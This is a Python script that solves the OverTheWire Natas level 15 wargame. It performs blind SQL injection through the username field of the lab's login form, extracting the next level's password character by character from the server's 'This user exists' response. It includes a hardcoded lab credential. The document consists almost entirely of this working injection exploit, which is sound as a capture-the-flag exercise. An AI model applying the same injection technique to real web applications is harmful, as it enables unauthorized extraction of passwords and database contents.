import requests
import string

target = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")  # Replace with natas15 password
password = ""

for i in range(len(password), 32):  # 32-character password
    test_data = {'username' : f'natas16" AND password REGEXP "{password}' + '[[:alpha:]][[:alnum:]]*'}
    test_r = requests.post(target, test_data, auth=auth)
    chosen_chaset=string.digits
    if "This user exists" in test_r.text:
        chosen_chaset = string.ascii_letters
    
    best = None 
    for char in chosen_chaset:
        # Test if character at position i is >= charset[mid]
        r = requests.post(target, auth=auth, data={'username': f'natas16" AND password LIKE BINARY "{password + char}%'})
        if "This user exists" in r.text:
            best = char
            break
    if best is None:
        print("Error")
        break
    password += char
    print(f"Progress: {password.ljust(32, '*')}")

print(f"Final password: {password}")